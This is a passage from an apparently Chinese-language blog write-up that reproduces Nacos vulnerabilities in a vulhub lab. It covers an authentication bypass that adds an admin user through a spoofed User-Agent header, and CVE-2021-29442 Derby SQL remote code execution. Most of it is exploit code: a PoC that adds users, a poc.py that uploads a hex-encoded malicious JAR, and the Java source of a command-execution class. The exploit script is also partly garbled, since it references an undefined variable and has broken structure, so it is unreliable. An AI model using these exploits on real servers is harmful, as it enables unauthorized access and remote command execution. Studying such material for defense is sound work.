class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Nacos-Server&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">target</span>):</span><br><span class="line">    endpoint = <span class="string">&quot;/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&quot;</span></span><br><span class="line">    r = requests.get(target.strip(<span class="string">&quot;/&quot;</span>) + endpoint, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;pageItems&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> target + <span class="string">&quot; has vulnerabilities&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span> target + <span class="string">&quot;has not vulnerabilities&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_user</span>(<span class="params">target</span>):</span><br><span class="line">    add_user_endpoint = <span class="string">&quot;/nacos/v1/auth/users?username=vulhub&amp;password=vulhub&quot;</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(target.strip(<span class="string">&quot;/&quot;</span>) + add_user_endpoint, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;create user ok&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Add User Success&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;New User Info: vulhub/vulhub&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Nacos Login Endpoint: &#123;&#125;/nacos/&quot;</span>.<span class="built_in">format</span>(target)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Add User Failed&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Please specify the target: python poc.py http://xxxxx:8848&quot;</span></span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> check(sys.argv[<span class="number">1</span>]):</span><br><span class="line">        add_user(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241107162122854.png" alt="image-20241107162122854"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞利用过程如下：</p><ol><li>修改User-Agent的值为Nacos-Server到请求包中</li></ol><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Nacos-Server&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>访问<a href="http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9%E6%9F%A5%E7%9C%8B%E7%8A%B6%E6%80%81%E7%A0%81%E6%98%AF%E5%90%A6%E4%B8%BA200%EF%BC%8C%E4%B8%94%E5%86%85%E5%AE%B9%E4%B8%AD%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%60pageItems%60">http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9查看状态码是否为200，且内容中是否包含`pageItems`</a></li></ol><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">target</span>):</span><br><span class="line">    endpoint = <span class="string">&quot;/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&quot;</span></span><br><span class="line">    r = requests.get(target.strip(<span class="string">&quot;/&quot;</span>) + endpoint, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;pageItems&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> target + <span class="string">&quot; has vulnerabilities&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span> target + <span class="string">&quot;has not vulnerabilities&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><ol start="3"><li>使用POST方式访问<a href="http://target:8848/nacos/v1/auth/users?username=vulhub&amp;password=vulhub%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%94%A8%E6%88%B7">http://target:8848/nacos/v1/auth/users?username=vulhub&amp;password=vulhub添加一个新用户</a></li><li>访问<a href="http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9%E8%8E%B7%E5%8F%96%E5%B7%B2%E6%9C%89%E7%9A%84%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8">http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9获取已有的用户列表</a></li></ol><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_user</span>(<span class="params">target</span>):</span><br><span class="line">    add_user_endpoint = <span class="string">&quot;/nacos/v1/auth/users?username=vulhub&amp;password=vulhub&quot;</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(target.strip(<span class="string">&quot;/&quot;</span>) + add_user_endpoint, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;create user ok&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Add User Success&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;New User Info: vulhub/vulhub&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Nacos Login Endpoint: &#123;&#125;/nacos/&quot;</span>.<span class="built_in">format</span>(target)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Add User Failed&quot;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>访问<a href="http://target:8848/nacos/%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%B7%BB%E5%8A%A0%E7%9A%84%E6%96%B0%E7%94%A8%E6%88%B7(vulhub/vulhub)%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95">http://target:8848/nacos/，使用添加的新用户(vulhub/vulhub)进行登录</a></li></ol><p><img src="/../image/image-20241107162440039.png" alt="image-20241107162440039"></p><h2 id="CVE-2021-29442-未授权接口RCE"><a href="#CVE-2021-29442-未授权接口RCE" class="headerlink" title="CVE-2021-29442(未授权接口RCE)"></a>CVE-2021-29442(未授权接口RCE)</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Nacos 是一个设计用于动态服务发现、配置和服务管理的易于使用的平台。</p><p>在Nacos 1.4.1之前的版本中，一些API端点（如<code>/nacos/v1/cs/ops/derby</code>）可以默认没有鉴权，可以被未经身份验证的用户公开访问。攻击者可以利用该漏洞执行任意Derby SQL语句和 Java 代码。</p><p>nacos带有一个嵌入式的小型数据库derby，而在版本&lt;&#x3D;1.4.0的默认配置部署nacos的情况下，它无需认证即可被访问，并执行任意sql查询，导致敏感信息泄露，后上周的所谓Nacos最新oday，其实也就是利用的同一个接口。<br>而CVE-2021-29442是因为最开始开发者没有为这个内存型数据库接口配置任何的访问控制引发的。</p><p>参考资料：</p><ul><li><a href="https://github.com/advisories/GHSA-xv5h-v7jh-p2qh">https://github.com/advisories/GHSA-xv5h-v7jh-p2qh</a></li><li><a href="https://github.com/alibaba/nacos/issues/4463">https://github.com/alibaba/nacos/issues/4463</a></li><li><a href="https://github.com/ayoundzw/nacos-poc">https://github.com/ayoundzw/nacos-poc</a></li><li><a href="http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce">http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce</a></li></ul><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>先启动服务,访问验证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>可以直接访问相关接口验证漏洞是否存在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.137:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241107171316107.png" alt="image-20241107171316107"></p><p>可以看到用户名和相应的密码，也可以进一步解密， 因为加密算法是公开的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alibaba.nacos.console.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Password encoder tool.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> nacos</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PasswordEncoderUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>().encode(<span class="string">&quot;nacos&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Boolean <span class="title function_">matches</span><span class="params">(String raw, String encoded)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>().matches(raw, encoded);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encode</span><span class="params">(String raw)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>().encode(raw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nacos用到了security的BCryptPasswordEncoder加密器进行加密,这种加密算法使用哈希算法+随机盐来对字符串加密，对相同的内容多次加密出来的结果不一样却又能校验成功，这样更能保证密码不被破解。BCryptPasswordEncoder提供了encode方法用来对明文进行加密，matches方法用来校验明文密码和密文是否匹配</p><p>这里直接利用官方给出的脚本和jar包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python poc.py -t http://192.168.174.137:8848 -c &quot;id&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241108154919466.png" alt="image-20241108154919466"></p><p>poc.py</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target, command</span>):</span><br><span class="line">    removal_url = urljoin(target, <span class="string">&#x27;/nacos/v1/cs/ops/data/removal&#x27;</span>)</span><br><span class="line">    derby_url = urljoin(target, <span class="string">&#x27;/nacos/v1/cs/ops/derby&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    hex_jar = <span class="string">&#x27;504b03040a000008000033b9f058000000000000000000000000090000004d4554412d494e462f504b030414000008080033b9f058fcfe28795000000051000000140000004d4554412d494e462f4d414e49464553542e4d46f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5722e4a4d2c494dd175aab452f04d2c4bcd53f0720c5208c8294dcfcc5330d63306a9712acdcc49d1f54ac9d60d2e484d066a34e4e5e2e50200504b03040a0000080000cfaaef5800000000000000000000000004000000636f6d2f504b03040a000008000097b0f0580000000000000000000000000c000000636f6d2f747267616e64612f504b03040a000008000033b9f0580000000000000000000000000f0000004d4554412d494e462f6d6176656e2f504b03040a000008000033b9f0580000000000000000000000001b0000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f504b03040a000008000033b9f058000000000000000000000000230000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f504b030414000008080033b9f0589475fc2c7b040000720800000a000000457865632e636c6173738d555b535b5514fe4e48b20f87700b0448e90d6bdb700958b55a435b2d6d6ab1e162a060506b4f4e4ee04048e2c909975ab53ae38ce33ff0c5195fe4b5be848eccf8d8077f8ccf3e15bf7d02210c716c26b3f75e6b7dfb5b6bafb5d7d97fbdfce34f006fe37b0daf6352e0230d1e4caab8af22a1610ad32a6634dcc1ac8a8f3524312787790d713c1058d0d08a45814f34b423258725b9fd5381cf043ed7d02d191f6ae8c1171abaf0486a7429ea02690143c369e92b2367531ab37295951c598165811505feeb56de726e2a688a0c2e28f0de2e644c05ed092b6f4e97d7d3a63dafa773d404130543cf2de8b625e503a5d759b14ae448c4b74c639cb2c959c1a5486255dfd0c7727a7e796cceb1adfcf2f8e049950261ace876c974247d03b3bf509ad6d7e947292ae8aa43ccda05c32c950869caca0042559b55189bcc17cb0e094c7d5d5aad92ada0bf913569ea19d326c69326a4af06992867b3a66d666a766f8ea9602c9bb6e59884f6d4a0d538175dbd3c4c91a20b390a6756aa6a08c5acd9dc63c4b70cb3e85885bc0cd558cfc860b2b560ea72510d8aa8d6394737d6a6f4a25b00014b6055604d81365728db8679d792656996e5189524015cc425c6dc985081afec64a3d7187ba1349a67aa057201ac234acda295cf14364b01e4516078cbe9358162005fc20e6004d43b282b08ff676aa5eb8d43d727122bad9b016c613b80c7f88ae56d901605dd8d727d083e9e5fc9f82480aff14d00dfca43d7409333758cbd275361e53292d41f4f2667923119cfd300bec3366b1f77ef73c7d19e99f4aa6938c754551a059d27ee677d0c47e939be79bbe49854b52c9b0e77154ddba15fade4e8b6535ab41c7668a851372d1df3972ce71d4b368a469a9a108ad437dd819a97e8f2ffb4e75177b591ee58e4bd8794275a6d28d2d0d0c013bf325d47e0833e935a953b3209b7dbba230dbf177ebd5834f3ec939157fac2d4daa6cedf41334a7fed6ec3ba1d356feb06ddf6451a76ae04fb8c5ca14448f4153dbb978aae55a75055610017f806c89f078aec4b8e97298d715638fb8676a1fcee9a231cfdae52c520c7401580210c736e66ff45ab9b3d7e782903bfedc193da455322e89d0afa9ec33f1d7d81f6685054a0fe0c7fb079ea39b4a10a5a62deb0b78240ccb787d654d837b28bb6987f0feda9b07f171d31a1c4d4303775a662ea0bb40e87d50a828b3bfb7fefe0d6d41ebae92334bd879e547417bd31ef8824eb8b5610968b533bf049e2d3449d099eade01c2de7395530f06cb882d79ef16c2a1ec1e06bf5043fe047f4a3c93ded125f2da085d6568e6de8e46377161d4c5a90a7eec215be5e3710c23de2eea3170be823cf45329d42862c393e6c1b3843d673788af3e41ec04f4cf7af4cb3cce063e6b0050f30ca747bc83e8337b86a22f73be47e9359bc42f92dbed43efab980abd4fbe9ad0fefe21a047d86f01e112a3d5d450ce3dcbbc16a5c27dacb086ee026de27332b810f889395fb05b730c13adda6f410e22506043c0277f8df6750cdeef240211017b82bd02ad04e11d8e781ab36924e0874edf334bec32d5d02dd82a95004fa957fe4021fba37e7debf504b030414000008080058aaef5840b75f2d53010000eb0200002a0000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e786d6c8d91cd6ec2301084ef3c45947bec507a40c8b5d443ab56828204ad7a35f636982676643b84be7d6d879fe440d55b76f6db9df186d446ef81bbe45895ca3ea43be7ea19c6153b8042ac667c07489b02af960b7c8f7294a71d393b5a79a1dbb645ed247277793ec69f8bf9da0f562c93ca3aa638a4a324f113331be5b9e6cc49adfe6197dc228e5674621639e4eb947a17526901e50718eb0d68ec113cd046812a8c6eea5741b9ae9033055382117c1603c08c935f8c3b5f1a28c05b12dcd30272382d1ca33c5bbf3daed62fcb0dc16735103eee372ba42ae89e1982af65cca05805d7e5b10a72634a7ae3d50487661cf6ffad069f076c18ea84f023d1b691a540563786c393e25a04bff7cd7336f501fe62c256dc5f1b04013528018a5f8d2ed24f27f4aeb96f9474833bc676ef6e276278c9089def364153341e9c31b62df7c1a803eba7bbef2e0d1ec6e9d531f1e5cd74f40b504b0304140000080800ca82f0586a0b6b6f3c0000003c000000310000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e70726f706572746965734b2c2ac94c4b4c2ef14cb12d4a4d4fcd2f4ae74a2fca2f2d00f293f373f54a8ad213f35212b9ca528b8a33f3f36c0df50c7483fd1c03823dfc43b800504b010214030a000008000033b9f058000000000000000000000000090000000000000000001000ed41000000004d4554412d494e462f504b0102140314000008080033b9f058fcfe28795000000051000000140000000000000000000000a481270000004d4554412d494e462f4d414e49464553542e4d46504b010214030a0000080000cfaaef58000000000000000000000000040000000000000000001000ed41a9000000636f6d2f504b010214030a000008000097b0f0580000000000000000000000000c0000000000000000001000ed41cb000000636f6d2f747267616e64612f504b010214030a000008000033b9f0580000000000000000000000000f0000000000000000001000ed41f50000004d4554412d494e462f6d6176656e2f504b010214030a000008000033b9f0580000000000000000000000001b0000000000000000001000ed41220100004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f504b010214030a000008000033b9f058000000000000000000000000230000000000000000001000ed415b0100004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f504b0102140314000008080033b9f0589475fc2c7b040000720800000a0000000000000000000000a4819c010000457865632e636c617373504b0102140314000008080058aaef5840b75f2d53010000eb0200002a0000000000000000000000a4813f0600004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e786d6c504b01021403140000080800ca82f0586a0b6b6f3c0000003c000000310000000000000000000000a481da0700004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e70726f70657274696573504b0506000000000a000a00ab020000650800000000&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Nacos-Server&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">         get_sql = <span class="string">f&quot;SELECT * FROM (SELECT COUNT(*) AS b, S_EXAMPLE_<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>(&#x27;<span class="subst">&#123;command&#125;</span>&#x27;) AS a FROM config_info) tmp&quot;</span></span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: post_sql&#125;</span><br><span class="line">        post_resp = requests.post(url=removal_url, files=files, headers=headers)</span><br><span class="line">        post_json = post_resp.json()</span><br><span class="line">        <span class="keyword">if</span> post_json.get(<span class="string">&#x27;message&#x27;</span>, <span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> post_json.get(<span class="string">&#x27;data&#x27;</span>, <span class="literal">None</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(post_resp.text)</span><br><span class="line">            get_resp = requests.get(url=derby_url, params=&#123;<span class="string">&#x27;sql&#x27;</span>: get_sql&#125;)</span><br><span class="line">            <span class="built_in">print</span>(get_resp.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Exploit script for Nacos CVE-2021-29442&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target URL&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Command to execute&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    exploit(args.target, args.command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是利用sql来写入可以执行指令的jar包，那个hex_jar的源码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: Exec  reason: default package */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">exec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">charset</span> <span class="operator">=</span> <span class="string">&quot;utf-8&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osName != <span class="literal">null</span> &amp;&amp; osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">                charset = <span class="string">&quot;gbk&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(Runtime.getRuntime().exec(cmd).getInputStream(), charset));</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">                <span class="keyword">if</span> (line == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> bf.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                bf.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">StringWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">printer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(writer);</span><br><span class="line">            e.printStackTrace(printer);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                writer.close();</span><br><span class="line">                printer.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + writer.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段 Java 代码定义了一个 <code>Exec</code> 类，它提供了一个方法 <code>exec</code> 来执行操作系统命令，并将命令输出作为字符串返回。以下是代码的详细解析：</p><h4 id="代码功能"><a href="#代码功能" class="headerlink" title="代码功能"></a>代码功能</h4><ul><li><p><code>exec(String cmd)</code></p><p>:</p><ul><li>接收一个字符串参数 <code>cmd</code>，代表需要执行的操作系统命令。</li><li>通过 <code>Runtime.getRuntime().exec(cmd)</code> 执行命令。</li><li>读取命令的标准输出，并将其以字符串形式返回。</li><li>如果发生异常，会捕获并返回错误信息。</li></ul></li></ul><h4 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h4><h5 id="1-设置字符集"><a href="#1-设置字符集" class="headerlink" title="1. 设置字符集"></a>1. <strong>设置字符集</strong></h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">charset</span> <span class="operator">=</span> <span class="string">&quot;utf-8&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">osName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (osName != <span class="literal">null</span> &amp;&amp; osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">    charset = <span class="string">&quot;gbk&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>默认字符集为 UTF-8。</li><li>如果操作系统是 <strong>Windows</strong>，则将字符集切换为 GBK（Windows 下常用字符集）。</li></ul><h5 id="2-执行命令"><a href="#2-执行命令" class="headerlink" title="2. 执行命令"></a>2. <strong>执行命令</strong></h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(Runtime.getRuntime().exec(cmd).getInputStream(), charset)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><strong><code>Runtime.getRuntime().exec(cmd)</code></strong> 执行 <code>cmd</code> 命令。</li><li>使用 <strong><code>BufferedReader</code></strong> 包装命令的标准输出流，按行读取输出结果。</li></ul><h5 id="3-读取命令输出"><a href="#3-读取命令输出" class="headerlink" title="3. 读取命令输出"></a>3. <strong>读取命令输出</strong></h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">    <span class="keyword">if</span> (line == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> bf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    bf.append(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>不断读取命令输出，直到流中没有更多数据 (<code>readLine()</code> 返回 <code>null</code>)。</li><li>将每一行追加到 <code>StringBuffer</code> 中。</li></ul><h5 id="4-异常处理"><a href="#4-异常处理" class="headerlink" title="4. 异常处理"></a>4. <strong>异常处理</strong></h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="type">StringWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(writer);</span><br><span class="line">    e.printStackTrace(printer);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        writer.close();</span><br><span class="line">        printer.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + writer.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>捕获执行过程中可能抛出的任何异常。</li><li>使用 <strong><code>StringWriter</code></strong> 和 <strong><code>PrintWriter</code></strong> 捕获异常栈信息，将其返回以供调试。</li></ul><p><strong>漏洞利用函数：<code>exploit</code></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target, command</span>):</span><br><span class="line">    removal_url = urljoin(target, <span class="string">&#x27;/nacos/v1/cs/ops/data/removal&#x27;</span>)</span><br><span class="line">    derby_url = urljoin(target, <span class="string">&#x27;/nacos/v1/cs/ops/derby&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>定义两个 URL，分别用于数据操作和数据库查询：<ul><li>**<code>removal_url</code>**：用于上传恶意文件。</li><li>**<code>derby_url</code>**：用于执行 SQL 查询。</li></ul></li></ul><h4 id="上传恶意-JAR-文件"><a href="#上传恶意-JAR-文件" class="headerlink" title="上传恶意 JAR 文件"></a>上传恶意 JAR 文件</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: post_sql&#125;</span><br><span class="line">post_resp = requests.post(url=removal_url, files=files, headers=headers)</span><br></pre></td></tr></table></figure><ul><li>向 <code>removal_url</code> 上传了一个伪造的 JAR 文件（存储在 <code>hex_jar</code> 中的 Base64 数据）。</li></ul><h4 id="执行-SQL-注入命令"><a href="#执行-SQL-注入命令" class="headerlink" title="执行 SQL 注入命令"></a>执行 SQL 注入命令</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">get_sql 